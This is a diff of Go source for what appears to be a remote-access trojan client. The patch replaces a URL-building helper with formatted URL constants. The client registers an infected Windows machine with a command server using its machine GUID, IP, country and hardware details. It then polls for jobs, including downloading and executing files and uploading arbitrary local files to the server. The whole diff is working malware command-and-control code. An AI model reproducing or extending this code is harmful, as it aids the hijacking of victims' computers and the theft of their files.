@@ -14,16 +14,6 @@ import (
 	"time"
 )
 
-type RequestType int
-
-const (
-	REGISTER_R RequestType = iota
-	HARDWARE_R
-	RETRIEVE_R
-	REPORTS_R
-	UPLOADS_R
-)
-
 type Worker struct {
 	id        string
 	isAdmin   bool
@@ -46,24 +36,6 @@ type HardwareInfo struct {
 	Ram string `json:"ram"`
 }
 
-// TODO: check for wrong input?
-func buildRequestUrl(reqType RequestType, workerId, jobId string) string {
-	baseUrl := SERVER_ADDR + "/api/workers/" + workerId
-	switch reqType {
-	case RETRIEVE_R:
-		return baseUrl + "/jobs?undone"
-	case REPORTS_R:
-		return baseUrl + "/jobs/" + jobId + "/report"
-	case UPLOADS_R:
-		return baseUrl + "/uploads"
-	case HARDWARE_R:
-		return baseUrl + "/hardware"
-	case REGISTER_R:
-		return SERVER_ADDR + "/api/workers"
-	}
-	return ""
-}
-
 func NewWorker() *Worker {
 	uuid, _ := win.GetMachineGuid()
 	uuid, _ = utils.UuidStrToBase64Str(uuid)
@@ -82,10 +54,9 @@ func (w *Worker) register() bool {
 	hostInfo.IpAddr, hostInfo.Country = utils.GetMyIpCountry()
 
 	reqBody, _ := json.Marshal(hostInfo)
-	registerUrl := buildRequestUrl(REGISTER_R, w.id, "")
 
 	for i := 1; i <= MAX_RETRIES; i++ {
-		resp, err := http.Post(registerUrl, "application/json", bytes.NewBuffer(reqBody))
+		resp, err := http.Post(REG_URL, "application/json", bytes.NewBuffer(reqBody))
 		if err == nil {
 			resp.Body.Close()
 			w.tellHardwareInfo()
@@ -104,16 +75,14 @@ func (w *Worker) tellHardwareInfo() {
 	hardwareInfo.Ram = utils.ToReadableSize(totalRam)
 
 	reqBody, _ := json.Marshal(hardwareInfo)
-	hardwareInfoUrl := buildRequestUrl(HARDWARE_R, w.id, "")
-
-	resp, err := http.Post(hardwareInfoUrl, "application/json", bytes.NewBuffer(reqBody))
+	resp, err := http.Post(fmt.Sprintf(HARDWARE_URL, w.id), "application/json", bytes.NewBuffer(reqBody))
 	if err == nil {
 		resp.Body.Close()
 	}
 }
 
 func (w *Worker) poll() {
-	jobsUrl := buildRequestUrl(RETRIEVE_R, w.id, "")
+	jobsUrl := fmt.Sprintf(JOBS_URL, w.id)
 	errorN := 0
 	for {
 		resp, err := http.Get(jobsUrl)
@@ -170,8 +139,7 @@ func (w *Worker) resolve(job *Job) {
 			w.report(job.Id, "File downloaded and executed.")
 		}
 	case UPLOAD:
-		dest := buildRequestUrl(UPLOADS_R, w.id, "")
-		loc, err := utils.UploadFile(args[0], dest)
+		loc, err := utils.UploadFile(args[0], fmt.Sprintf(UPLOADS_URL, w.id))
 		if err == nil {
 			w.report(job.Id, "File uploaded to "+path.Join(SERVER_ADDR, loc))
 		}
@@ -192,8 +160,8 @@ func (w *Worker) resolve(job *Job) {
 }
 
 func (w *Worker) report(jobId int, rep string) {
-	reportUrl := buildRequestUrl(REPORTS_R, w.id, strconv.Itoa(jobId))
-	resp, err := http.Post(reportUrl, "text/plain;charset=UTF-8", strings.NewReader(rep))
+	resp, err := http.Post(fmt.Sprintf(REPORTS_URL, w.id, jobId), "text/plain;charset=UTF-8",
+		strings.NewReader(rep))
 	if err == nil {
 		resp.Body.Close()
 	}
